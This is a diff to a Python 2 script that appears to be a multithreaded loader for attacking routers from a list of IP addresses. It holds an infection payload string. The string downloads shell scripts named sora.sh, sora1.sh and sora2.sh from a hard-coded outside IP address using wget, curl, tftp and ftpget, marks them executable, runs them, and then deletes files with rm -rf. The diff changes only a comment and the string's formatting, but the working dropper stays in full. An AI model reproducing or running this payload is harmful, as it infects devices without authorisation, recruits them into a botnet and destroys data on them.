@@ -3,7 +3,7 @@ import threading
 import sys, os, re, time, socket
 from Queue import *
 from sys import stdout
-#Put Your Payload On Line 95 ;) ex: Payload Goes In Between The ---> ""
+#Put Your Payload On Line 55 ;) ex: Payload Goes In Between The ---> ""
 
 if len(sys.argv) < 4:
     print "Usage: python "+sys.argv[0]+" <list> <threads> <output>"
@@ -52,7 +52,7 @@ class router(threading.Thread):
     def __init__ (self, ip):
         threading.Thread.__init__(self)
         self.ip = str(ip).rstrip('\n')
-        self.rekdevice=" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.188/sora.sh; curl -O http://5.181.80.188/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 5.181.80.188 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 5.181.80.188; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.181.80.188 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf * " 
+        self.rekdevice=("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.188/sora.sh; curl -O http://5.181.80.188/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 5.181.80.188 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 5.181.80.188; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.181.80.188 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *") 
     def run(self):
         global fh
         username = ""
